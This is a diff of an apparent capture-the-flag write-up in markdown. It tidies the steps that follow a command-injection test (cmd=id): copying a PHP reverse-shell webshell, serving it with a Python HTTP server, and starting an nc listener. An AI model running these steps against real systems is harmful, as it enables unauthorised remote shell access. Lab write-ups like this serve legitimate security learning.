@@ -70,12 +70,14 @@ try execute id `name=admin&username=admin&password=admin&access=access&cmd=id`
 
 
 code was executed. Now run reverse shell (w/ machine IP) nc and host it on webserver
-`cp /usr/share/webshells/php/php-reverse-shell.php .`
+
 
 ```
+cp /usr/share/webshells/php/php-reverse-shell.php .
+python3 -m http.server 9999
+nc -nlvp 1234 
 ```
 
-python3 -m http.server 999
 
 
 ---
